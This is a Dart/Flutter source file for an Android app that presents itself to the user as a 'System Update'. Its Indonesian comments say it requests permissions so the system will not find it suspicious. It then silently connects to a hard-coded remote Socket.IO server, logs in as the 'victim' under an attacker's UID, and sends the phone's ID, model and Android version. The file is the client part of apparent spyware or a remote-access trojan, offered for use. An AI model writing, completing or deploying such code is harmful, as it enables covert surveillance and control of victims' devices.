import 'dart:async';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';

// ⚠️ URL SERVER BARU ⚠️
const String SERVER_URL = 'http://danmaunikahsamalila.r-cloud.my.id:25574'; 

// ⚠️ GANTI DENGAN UID DARI APLIKASI XEROANGEL KAMU ⚠️
const String TARGET_UID = 'd7e27df25f68d737f7a454b58a97f77c'; 

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // Minta izin dasar agar aplikasi tidak dicurigai sistem
  await [
    Permission.notification,
    Permission.storage,
  ].request();

  runApp(const MyApp());
  
  // Beri jeda 1 detik sebelum konek ke server
  Timer(const Duration(seconds: 1), () {
    _connectToServer();
  });
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(body: Center(child: Text('System Update'))),
    );
  }
}

Future<void> _connectToServer() async {
  try {
    final androidInfo = await DeviceInfoPlugin().androidInfo;

    // Inisialisasi koneksi Socket.IO
    IO.Socket socket = IO.io(SERVER_URL, 
      IO.OptionBuilder()
      .setTransports(['websocket'])
      .setExtraHeaders({'x-auth-token': TARGET_UID})
      .enableAutoConnect()
      .setReconnectionAttempts(10)
      .build()
    );

    socket.onConnect((_) {
      print('✅ KONEK BERHASIL KE SERVER');
      
      // 1. Login sebagai korban (wajib untuk sync.js)
      socket.emit('controller:join', {'token': TARGET_UID});

      // 2. Daftarkan Device (beri jeda sedikit agar login selesai)
      Timer(const Duration(milliseconds: 500), () {
        socket.emit('device:register', {
          'deviceId': androidInfo.id,
          'name': androidInfo.model,
          'battery': 100,
          'charging': false,
          'sdkVersion': androidInfo.version.sdkInt.toString(),
          'androidVersion': androidInfo.version.release,
          'uid': TARGET_UID,
        });
        print('📤 DATA DEVICE DIKIRIM KE SERVER');
      });
    });

    socket.onConnectError((err) => print('❌ GAGAL KONEK: $err'));
    socket.onError((err) => print('❌ ERROR SOCKET: $err'));
    socket.onDisconnect((_) => print('🔌 TERPUTUS DARI SERVER'));
    
  } catch (e) {
    print('Error inisialisasi: $e');
  }
}
